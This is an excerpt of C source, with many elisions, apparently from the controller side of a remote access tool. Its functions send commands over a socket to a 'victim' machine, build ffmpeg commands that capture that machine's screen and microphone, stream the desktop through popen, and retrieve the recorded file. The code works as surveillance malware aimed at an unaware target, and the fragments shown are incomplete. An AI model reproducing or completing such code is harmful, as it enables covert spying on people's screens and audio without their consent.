...
void kali_streaming_watch(char *IP)
{
    SOCKET sock = 0;
    SOCKADDR_IN sin;
    ...
    if(IP == NULL)
    {
        error("malloc() IP", "kali_streaming_watch()");
        exit(-1);
    }
    ...
    {
        error("malloc() final_victim_cmd", "kali_streaming_watch()");
        exit(-1);
    }
    ...
    {
        error("socket()", "kali_streaming_watch()");
        exit(-1);
    }
    ...
    if(err == SOCKET_ERROR)
    {
        error("connect()", "kali_streaming_watch()");
        exit(-1);
    }

    printf("\t\tKALI LINUX STREAM STARTED ....\n");

    if(send(sock, (char*)&flag_watch, sizeof(flag_watch), 0) == SOCKET_ERROR)
    {
        error("send() flag_watch", "kali_streaming_watch()");
        exit(-1);
    }
    ...
    if(flag_watch == 13)
    {
        ...
        {
            error("send() len_final_cmd", "kali_streaming_watch()");
            exit(-1);
        }

        if(send(sock, final_victime_cmd, len_final_cmd, 0) == SOCKET_ERROR)
        {
            error("send() final_victime_cmd", "kali_streaming_watch()");
            exit(-1);
        }
        ...
        if(pipe == NULL)
        {
            error("popen() pipe", "kali_streaming_watch()");
            exit(-1);
        }
    }
...
void kali_record()
{
    ...
    {
        error("malloc() time_of_record", "kali_record()");
        exit(-1);
    }
    ...
    switch(gtk_dialog_run(GTK_DIALOG(record_sound_dialog)))
    {
        case GTK_RESPONSE_YES:
            ...
            if(final_victime_cmd == NULL)
            {
                error("malloc() final_victim_cmd", "kali_record()");
                exit(-1);
            }
            ...
            final_victime_cmd = strcat(final_victime_cmd, " -i :1 -acodec pcm_s16le -vcodec libx264 -t ");
...
//ffmpeg -f alsa -ac 2 -i pulse -f x11grab -r 30 -s 1920x1080 -i :0.0 -acodec pcm_s16le -vcodec libx264 -t 10 bureau.flv
        ...
        case GTK_RESPONSE_NO:
            ...
            final_victime_cmd = strcat(final_victime_cmd, time_of_record);
            final_victime_cmd = strcat(final_victime_cmd, " ");
            final_victime_cmd = strcat(final_victime_cmd, "-i :1 -vcodec libx264 -crf 0 -preset ultrafast desktop.mkv");
    ...
    {
        error("send() flag_record", "kali_record()");
        exit(-1);
    }
    ...
    if(flag_record == 14)
    {
        ...
        {
            error("send() sound_on", "kali_record()");
            exit(-1);
        }

        if(send(sock, (char*)&len_time_of_rec, sizeof(len_time_of_rec), 0) == SOCKET_ERROR)
        {
            error("send() len_time_of_rec", "kali_record()");
            exit(-1);
        }

        if(send(sock, time_of_record, len_time_of_rec, 0) == SOCKET_ERROR)
        {
            error("send() time_of_record", "kali_record()");
            exit(-1);
        }

        if(send(sock, (char*)&len_final_cmd, sizeof(len_final_cmd), 0) == SOCKET_ERROR)
        {
            error("send() len_final_cmd", "kali_record()");
            exit(-1);
        }

        if(send(sock, final_victime_cmd, len_final_cmd, 0) == SOCKET_ERROR)
        {
            error("send() final_victime_cmd", "kali_record()");
            exit(-1);
        }
        ...
        wait_end_of_record(time_of_record_convert + (time_of_record_convert + 20));
        ...
        if(sound_on == 0)
        {
            ...
            if(desktop_rec == NULL)
            {
                error("fopen() desktop.mkv", "kali_record()");
                exit(-1);
            }
        }
